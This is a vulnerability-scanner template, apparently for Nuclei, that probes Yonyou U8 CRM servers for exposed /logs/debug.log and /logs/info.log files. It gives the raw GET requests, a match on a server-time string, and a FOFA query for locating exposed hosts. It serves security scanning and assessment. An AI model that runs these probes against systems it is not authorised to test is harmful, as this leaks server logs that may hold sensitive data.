id: yonyou-u8-crm-logsfile-disclosure
info:
  name: 用友 U8 CRM debug.log & info.log - disclosure
  author: leadlife
  severity: high
  description: 用友GRP-U8日志泄漏漏洞
  reference: 
    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BGRP-U8%E6%97%A5%E5%BF%97%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-query: app="用友U8CRM"
  tags: yonyou,u8crm,fileread,oa

http:
  - raw:
      - |
        GET /logs/debug.log HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /logs/info.log HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "服务器时间"

      - type: status
        status:
          - 200